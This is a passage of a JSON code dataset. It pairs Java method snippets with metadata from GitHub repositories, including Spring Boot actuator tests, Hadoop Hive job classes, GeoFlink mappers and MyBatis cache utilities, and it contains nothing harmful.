"https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testErrorPageDirectAccess", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testErrorPageDirectAccess() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/error\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.INTERNAL_SERVER_ERROR);\t\tassertThat(entity.getBody().get(\"error\")).isEqualTo(\"None\");\t\tassertThat(entity.getBody().get(\"status\")).isEqualTo(999);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testBeans", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testBeans() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/actuator/beans\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\t\tassertThat(entity.getBody()).containsOnlyKeys(\"contexts\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testConfigProps", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testConfigProps() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/actuator/configprops\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\t\tMap<String, Object> body = entity.getBody();\t\tMap<String, Object> contexts = (Map<String, Object>) body.get(\"contexts\");\t\tMap<String, Object> context = (Map<String, Object>) contexts.get(this.applicationContext.getId());\t\tMap<String, Object> beans = (Map<String, Object>) context.get(\"beans\");\t\tassertThat(beans).containsKey(\"spring.datasource-\" + DataSourceProperties.class.getName());\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testLegacy", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testLegacy() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/actuator/legacy\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\t\tassertThat(entity.getBody()).contains(entry(\"legacy\", \"legacy\"));\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "asMapEntity", "params": ["ResponseEntity<Map>"], "throws": null, "modifiers": ["static"], "return_type": "ResponseEntity<Map>", "snippet": "\tstatic <K, V> ResponseEntity<Map<K, V>> asMapEntity(ResponseEntity<Map> entity) {\t\treturn (ResponseEntity) entity;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "b2i", "params": ["boolean"], "throws": null, "modifiers": ["static"], "return_type": "int", "snippet": "\tstatic int b2i(boolean b) {\t\treturn b ? 1 : 0;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/PrimitiveCasting.java", "stars": "12", "class": {"name": "PrimitiveCasting", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "c2i", "params": ["char"], "throws": null, "modifiers": ["static"], "return_type": "int", "snippet": "\tstatic int c2i(char c) {\t\treturn (int) c;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/PrimitiveCasting.java", "stars": "12", "class": {"name": "PrimitiveCasting", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "i2l", "params": ["int"], "throws": null, "modifiers": ["static"], "return_type": "long", "snippet": "\tstatic long i2l(int i) {\t\treturn (long) i;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/PrimitiveCasting.java", "stars": "12", "class": {"name": "PrimitiveCasting", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "l2s", "params": ["long"], "throws": null, "modifiers": ["static"], "return_type": "short", "snippet": "\tstatic short l2s(long i) {\t\treturn (short) i;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/PrimitiveCasting.java", "stars": "12", "class": {"name": "PrimitiveCasting", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\t// \u7528\u4e8c\u7ef4\u6570\u7ec4\u8868\u793a\u7684\u5b66\u751f\u6210\u7ee9:\t\tint[][] scores = { \t\t\t\t{ 82, 90, 91 }, \t\t\t\t{ 68, 72, 64 }, \t\t\t\t{ 95, 91, 89 }, \t\t\t\t{ 67, 52, 60 }, \t\t\t\t{ 79, 81, 85 }, \t\t};\t\t// TODO:\t\tdouble sum = 0;\t\tdouble count = 0;\t\tfor(int n = 0; n < 5; n++) {\t\t\tfor(int m = 0; m < 3; m++) {\t\t\t\tsum += scores[n][m];\t\t\t\tcount++;\t\t\t}\t\t}\t\tdouble average = sum / count;\t\tSystem.out.println(average);\t\tif (Math.abs(average - 77.733333) < 0.000001) {\t\t\tSystem.out.println(\"\u6d4b\u8bd5\u6210\u529f\");\t\t} else {\t\t\tSystem.out.println(\"\u6d4b\u8bd5\u5931\u8d25\");\t\t}\t}", "url": "https://raw.githubusercontent.com/IzzyPrime/JavaWorkspace/master/JavaPractice/part1/src/com/array/javapractice/ArrayAverage.java", "stars": "2", "class": {"name": "ArrayAverage", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws InterruptedException {\t\tsetUp(\"chrome\", \"https://opensource-demo.orangehrmlive.com/\");\t\tWebElement userN = driver.findElement(By.id(\"txtUsername\"));\t\tWebElement password = driver.findElement(By.name(\"txtPassword\"));\t\tActions act = new Actions(driver);\t\tact.keyDown(Keys.SHIFT).click(userN).sendKeys(\"hello\").perform();\t\tpassword.sendKeys(\"merhaba\", Keys.SHIFT);\t\tdriver.quit();\t\t\t}", "url": "https://raw.githubusercontent.com/fadimedibi/SeleniumTurkish/master/src/com/class7/KeysActions.java", "stars": "3", "class": {"name": "KeysActions", "extends": "CommonMethods", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        try (final BufferedWriter writer = new BufferedWriter(                new FileWriter(new File(\"file.txt\")))) {            for (int i = 0; i < 10; i++) {                writer.write(String.valueOf(Math.random()));                writer.newLine();            }        } catch (Exception e) {            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab6/src/test/java/OutputStreamTest.java", "stars": "2", "class": {"name": "OutputStreamTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "load", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void load(final String pluginPath) {    log.info(\"Loading plug-in checker and action types\");    final File triggerPluginPath = new File(pluginPath);    if (!triggerPluginPath.exists()) {      log.error(\"plugin path \" + pluginPath + \" doesn't exist!\");      return;    }    final ClassLoader parentLoader = getClass().getClassLoader();    final File[] pluginDirs = triggerPluginPath.listFiles();    final ArrayList<String> jarPaths = new ArrayList<>();    for (final File pluginDir : pluginDirs) {      if (!pluginDir.exists()) {        log.error(\"Error! Trigger plugin path \" + pluginDir.getPath()            + \" doesn't exist.\");        continue;      }      if (!pluginDir.isDirectory()) {        log.error(\"The plugin path \" + pluginDir + \" is not a directory.\");        continue;      }      // Load the conf directory      final File propertiesDir = new File(pluginDir, \"conf\");      Props pluginProps = null;      if (propertiesDir.exists() && propertiesDir.isDirectory()) {        final File propertiesFile = new File(propertiesDir, \"plugin.properties\");        final File propertiesOverrideFile =            new File(propertiesDir, \"override.properties\");        if (propertiesFile.exists()) {          if (propertiesOverrideFile.exists()) {            pluginProps =                PropsUtils.loadProps(null, propertiesFile,                    propertiesOverrideFile);          } else {            pluginProps = PropsUtils.loadProps(null, propertiesFile);          }        } else {          log.error(\"Plugin conf file \" + propertiesFile + \" not found.\");          continue;        }      } else {        log.error(\"Plugin conf path \" + propertiesDir + \" not found.\");        continue;      }      final List<String> extLibClasspath =          pluginProps.getStringList(\"trigger.external.classpaths\",              (List<String>) null);      final String pluginClass = pluginProps.getString(\"trigger.class\");      if (pluginClass == null) {        log.error(\"Trigger class is not set.\");      } else {        log.error(\"Plugin class \" + pluginClass);      }      URLClassLoader urlClassLoader = null;      final File libDir = new File(pluginDir, \"lib\");      if (libDir.exists() && libDir.isDirectory()) {        final File[] files = libDir.listFiles();        final ArrayList<URL> urls = new ArrayList<>();        for (int i = 0; i < files.length; ++i) {          try {            final URL url = files[i].toURI().toURL();            urls.add(url);          } catch (final MalformedURLException e) {            log.error(e);          }        }        if (extLibClasspath != null) {          for (final String extLib : extLibClasspath) {            try {              final File file = new File(pluginDir, extLib);              final URL url = file.toURI().toURL();              urls.add(url);            } catch (final MalformedURLException e) {              log.error(e);            }          }        }        urlClassLoader =            new URLClassLoader(urls.toArray(new URL[urls.size()]), parentLoader);      } else {        log.error(\"Library path \" + propertiesDir + \" not found.\");        continue;      }      Class<?> triggerClass = null;      try {        triggerClass = urlClassLoader.loadClass(pluginClass);      } catch (final ClassNotFoundException e) {        log.error(\"Class \" + pluginClass + \" not found.\");        continue;      }      final String source = FileIOUtils.getSourcePathFromClass(triggerClass);      log.info(\"Source jar \" + source);      jarPaths.add(\"jar:file:\" + source);      try {        Utils.invokeStaticMethod(urlClassLoader, pluginClass,            \"initiateCheckerTypes\", pluginProps, this);      } catch (final Exception e) {        log.error(\"Unable to initiate checker types for \" + pluginClass);        continue;      }      try {        Utils.invokeStaticMethod(urlClassLoader, pluginClass,            \"initiateActionTypes\", pluginProps, this);      } catch (final Exception e) {        log.error(\"Unable to initiate action types for \" + pluginClass);        continue;      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/PluginCheckerAndActionsLoader.java", "stars": "18", "class": {"name": "PluginCheckerAndActionsLoader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "run", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void run() throws Exception {    HadoopConfigurationInjector.prepareResourcesToInject(getJobProps(),        getWorkingDirectory());    if (shouldProxy && obtainTokens) {      userToProxy = getJobProps().getString(\"user.to.proxy\");      getLog().info(\"Need to proxy. Getting tokens.\");      // get tokens in to a file, and put the location in props      Props props = new Props();      props.putAll(getJobProps());      props.putAll(getSysProps());      tokenFile = HadoopJobUtils.getHadoopTokens(hadoopSecurityManager, props, getLog());      getJobProps().put(\"env.\" + HADOOP_TOKEN_FILE_LOCATION,          tokenFile.getAbsolutePath());    }    try {      super.run();      } catch (Throwable t) {      t.printStackTrace();      getLog().error(\"caught error running the job\");      throw new Exception(t);    } finally {      if (tokenFile != null) {        HadoopJobUtils.cancelHadoopTokens(hadoopSecurityManager, userToProxy, tokenFile, getLog());        if (tokenFile.exists()) {          tokenFile.delete();        }      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopHiveJob.java", "stars": "18", "class": {"name": "HadoopHiveJob", "extends": "JavaProcessJob", "implements": null, "modifiers": ["public"]}}, {"method_name": "getJavaClass", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "  protected String getJavaClass() {    return HADOOP_SECURE_HIVE_WRAPPER;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopHiveJob.java", "stars": "18", "class": {"name": "HadoopHiveJob", "extends": "JavaProcessJob", "implements": null, "modifiers": ["public"]}}, {"method_name": "getJVMArguments", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "  protected String getJVMArguments() {    String args = super.getJVMArguments();    String typeUserGlobalJVMArgs =        getJobProps().getString(\"jobtype.global.jvm.args\", null);    if (typeUserGlobalJVMArgs != null) {      args += \" \" + typeUserGlobalJVMArgs;    }    String typeSysGlobalJVMArgs =        getSysProps().getString(\"jobtype.global.jvm.args\", null);    if (typeSysGlobalJVMArgs != null) {      args += \" \" + typeSysGlobalJVMArgs;    }    String typeUserJVMArgs = getJobProps().getString(\"jobtype.jvm.args\", null);    if (typeUserJVMArgs != null) {      args += \" \" + typeUserJVMArgs;    }    String typeSysJVMArgs = getSysProps().getString(\"jobtype.jvm.args\", null);    if (typeSysJVMArgs != null) {      args += \" \" + typeSysJVMArgs;    }    if (shouldProxy) {      info(\"Setting up secure proxy info for child process\");      String secure;      secure =          \" -D\" + HadoopSecurityManager.USER_TO_PROXY + \"=\"              + getJobProps().getString(HadoopSecurityManager.USER_TO_PROXY);      String extraToken =          getSysProps().getString(HadoopSecurityManager.OBTAIN_BINARY_TOKEN,              \"false\");      if (extraToken != null) {        secure +=            \" -D\" + HadoopSecurityManager.OBTAIN_BINARY_TOKEN + \"=\"                + extraToken;      }      info(\"Secure settings = \" + secure);      args += secure;    } else {      info(\"Not setting up secure proxy info for child process\");    }    return args;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopHiveJob.java", "stars": "18", "class": {"name": "HadoopHiveJob", "extends": "JavaProcessJob", "implements": null, "modifiers": ["public"]}}, {"method_name": "getMainArguments", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "  protected String getMainArguments() {    ArrayList<String> list = new ArrayList<String>();    // for hiveconf    Map<String, String> map = getHiveConf();    if (map != null) {      for (Map.Entry<String, String> entry : map.entrySet()) {        list.add(\"-hiveconf\");        list.add(StringUtils.shellQuote(            entry.getKey() + \"=\" + entry.getValue(), StringUtils.SINGLE_QUOTE));      }    }    if (debug) {      list.add(\"-hiveconf\");      list.add(\"hive.root.logger=INFO,console\");    }    // for hivevar    Map<String, String> hiveVarMap = getHiveVar();    if (hiveVarMap != null) {      for (Map.Entry<String, String> entry : hiveVarMap.entrySet()) {        list.add(\"-hivevar\");        list.add(StringUtils.shellQuote(            entry.getKey() + \"=\" + entry.getValue(), StringUtils.SINGLE_QUOTE));      }    }    list.add(\"-f\");    list.add(getScript());    return StringUtils.join((Collection<String>) list, \" \");  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopHiveJob.java", "stars": "18", "class": {"name": "HadoopHiveJob", "extends": "JavaProcessJob", "implements": null, "modifiers": ["public"]}}, {"method_name": "getClassPaths", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "List<String>", "snippet": "  protected List<String> getClassPaths() {    List<String> classPath = super.getClassPaths();    classPath.add(getSourcePathFromClass(Props.class));    classPath.add(getSourcePathFromClass(HadoopSecureHiveWrapper.class));    classPath.add(getSourcePathFromClass(HadoopSecurityManager.class));    classPath.add(HadoopConfigurationInjector.getPath(getJobProps(),        getWorkingDirectory()));    List<String> typeClassPath =        getSysProps().getStringList(\"jobtype.classpath\", null, \",\");    if (typeClassPath != null) {      // fill in this when load this jobtype      String pluginDir = getSysProps().get(\"plugin.dir\");      for (String jar : typeClassPath) {        File jarFile = new File(jar);        if (!jarFile.isAbsolute()) {          jarFile = new File(pluginDir + File.separatorChar + jar);        }        File tempFile = jarFile.getAbsoluteFile();        if (!classPath.contains(tempFile.getPath())) {          classPath.add(tempFile.getPath());        }      }    }    List<String> typeGlobalClassPath =        getSysProps().getStringList(\"jobtype.global.classpath\", null, \",\");    if (typeGlobalClassPath != null) {      for (String jar : typeGlobalClassPath) {        if (!classPath.contains(jar)) {          classPath.add(jar);        }      }    }    return classPath;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopHiveJob.java", "stars": "18", "class": {"name": "HadoopHiveJob", "extends": "JavaProcessJob", "implements": null, "modifiers": ["public"]}}, {"method_name": "getScript", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "  protected String getScript() {    return getJobProps().getString(HIVE_SCRIPT);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopHiveJob.java", "stars": "18", "class": {"name": "HadoopHiveJob", "extends": "JavaProcessJob", "implements": null, "modifiers": ["public"]}}, {"method_name": "getHiveConf", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Map<String,String>", "snippet": "  protected Map<String, String> getHiveConf() {    return getJobProps().getMapByPrefix(HIVECONF_PARAM_PREFIX);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopHiveJob.java", "stars": "18", "class": {"name": "HadoopHiveJob", "extends": "JavaProcessJob", "implements": null, "modifiers": ["public"]}}, {"method_name": "getHiveVar", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Map<String,String>", "snippet": "  protected Map<String, String> getHiveVar() {    return getJobProps().getMapByPrefix(HIVEVAR_PARAM_PREFIX);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopHiveJob.java", "stars": "18", "class": {"name": "HadoopHiveJob", "extends": "JavaProcessJob", "implements": null, "modifiers": ["public"]}}, {"method_name": "getSourcePathFromClass", "params": ["Class<?>"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String getSourcePathFromClass(Class<?> containedClass) {    File file =        new File(containedClass.getProtectionDomain().getCodeSource()            .getLocation().getPath());    if (!file.isDirectory() && file.getName().endsWith(\".class\")) {      String name = containedClass.getName();      StringTokenizer tokenizer = new StringTokenizer(name, \".\");      while (tokenizer.hasMoreTokens()) {        tokenizer.nextElement();        file = file.getParentFile();      }      return file.getPath();    } else {      return containedClass.getProtectionDomain().getCodeSource().getLocation()          .getPath();    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopHiveJob.java", "stars": "18", "class": {"name": "HadoopHiveJob", "extends": "JavaProcessJob", "implements": null, "modifiers": ["public"]}}, {"method_name": "cancel", "params": [], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void cancel() throws InterruptedException {    super.cancel();    info(\"Cancel called.  Killing the Hive launched MR jobs on the cluster\");    String azExecId = jobProps.getString(CommonJobProperties.EXEC_ID);    final String logFilePath =        String.format(\"%s/_job.%s.%s.log\", getWorkingDirectory(), azExecId,            getId());    info(\"log file path is: \" + logFilePath);    HadoopJobUtils.proxyUserKillAllSpawnedHadoopJobs(logFilePath, jobProps, tokenFile, getLog());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopHiveJob.java", "stars": "18", "class": {"name": "HadoopHiveJob", "extends": "JavaProcessJob", "implements": null, "modifiers": ["public"]}}, {"method_name": "PointStream", "params": ["DataStream", "String", "UniformGrid"], "throws": null, "modifiers": ["public", "static"], "return_type": "DataStream<Point>", "snippet": "    public static DataStream<Point> PointStream(DataStream inputStream, String inputType, UniformGrid uGrid){        DataStream<Point> pointStream = null;        if(inputType.equals(\"GeoJSON\")) {            pointStream = inputStream.map(new GeoJSONToSpatial(uGrid));        }        else if (inputType.equals(\"CSV\")){            pointStream = inputStream.map(new CSVToSpatial(uGrid));        }        return pointStream;    }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/spatialStreams/SpatialStream.java", "stars": "2", "class": {"name": "SpatialStream", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "map", "params": ["ObjectNode"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "Point", "snippet": "        public Point map(ObjectNode json) throws Exception {            Point spatialPoint = new Point(json.get(\"value\").get(\"geometry\").get(\"coordinates\").get(0).asDouble(), json.get(\"value\").get(\"geometry\").get(\"coordinates\").get(1).asDouble(), uGrid);            return spatialPoint;        }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/spatialStreams/SpatialStream.java", "stars": "2", "class": {"name": "GeoJSONToSpatial", "extends": "RichMapFunction", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "map", "params": ["ObjectNode"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "Point", "snippet": "        public Point map(ObjectNode strTuple) throws Exception {            List<String> strArrayList = Arrays.asList(strTuple.toString().split(\"\\\\s*,\\\\s*\"));            Point spatialPoint = new Point(Double.parseDouble(strArrayList.get(0)), Double.parseDouble(strArrayList.get(1)), uGrid);            return spatialPoint;        }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/spatialStreams/SpatialStream.java", "stars": "2", "class": {"name": "CSVToSpatial", "extends": "RichMapFunction", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getRichType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "RichType", "snippet": "  public RichType getRichType() {    return richType;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/RichType.java", "stars": "15", "class": {"name": "RichType", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setRichType", "params": ["RichType"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setRichType(RichType richType) {    this.richType = richType;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/RichType.java", "stars": "15", "class": {"name": "RichType", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getRichProperty", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getRichProperty() {    return richProperty;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/RichType.java", "stars": "15", "class": {"name": "RichType", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setRichProperty", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setRichProperty(String richProperty) {    this.richProperty = richProperty;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/RichType.java", "stars": "15", "class": {"name": "RichType", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getRichList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List", "snippet": "  public List getRichList() {    return richList;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/RichType.java", "stars": "15", "class": {"name": "RichType", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setRichList", "params": ["List"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setRichList(List richList) {    this.richList = richList;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/RichType.java", "stars": "15", "class": {"name": "RichType", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getRichMap", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map", "snippet": "  public Map getRichMap() {    return richMap;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/RichType.java", "stars": "15", "class": {"name": "RichType", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setRichMap", "params": ["Map"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setRichMap(Map richMap) {    this.richMap = richMap;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/RichType.java", "stars": "15", "class": {"name": "RichType", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "clear", "params": ["Cache"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void clear(Cache cache) {    getTransactionalCache(cache).clear();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/TransactionalCacheManager.java", "stars": "15", "class": {"name": "TransactionalCacheManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getObject", "params": ["Cache", "CacheKey"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getObject(Cache cache, CacheKey key) {    return getTransactionalCache(cache).getObject(key);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/TransactionalCacheManager.java", "stars": "15", "class": {"name": "TransactionalCacheManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "putObject", "params": ["Cache", "CacheKey", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void putObject(Cache cache, CacheKey key, Object value) {    getTransactionalCache(cache).putObject(key, value);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/TransactionalCacheManager.java", "stars": "15", "class": {"name": "TransactionalCacheManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "commit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void commit() {    for (TransactionalCache txCache : transactionalCaches.values()) {      txCache.commit();    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/TransactionalCacheManager.java", "stars": "15", "class": {"name": "TransactionalCacheManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "rollback", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void rollback() {    for (TransactionalCache txCache : transactionalCaches.values()) {      txCache.rollback();    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/TransactionalCacheManager.java", "stars": "15", "class": {"name": "TransactionalCacheManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTransactionalCache", "params": ["Cache"], "throws": null, "modifiers": ["private"], "return_type": "TransactionalCache", "snippet": "  private TransactionalCache getTransactionalCache(Cache cache) {    return transactionalCaches.computeIfAbsent(cache, TransactionalCache::new);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/TransactionalCacheManager.java", "stars": "15", "class": {"name": "TransactionalCacheManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onWVCommand", "params": ["Execution"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onWVCommand(Execution execution) {        execution.sendMessage(new String[]{                \" \",                \" \u00a76\u00a7lWICKEDVIPS \u00a78- \u00a7fKeys Help.\",                \" \",                \" \u00a78\u279f \u00a7e/wv key generate <group> [duration] \u00a78- \u00a7fGenerates a KEY with the designer VIP rank.\",                \" \u00a78\u279f \u00a7e/wv key delete <key|id> \u00a78- \u00a7fDeletes a KEY.\",                \" \"        });    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/command/VipKeyCommand.java", "stars": "2", "class": {"name": "VipKeyCommand", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "blogIndex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String blogIndex(){        return \"site/hpp/Memories\";    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/controller/Memeories.java", "stars": "2", "class": {"name": "Memeories", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getInstance", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "EventManager", "snippet": "    public static EventManager getInstance() {        if (eventManager == null) {            eventManager = new EventManager();        }        return eventManager;    }", "url": 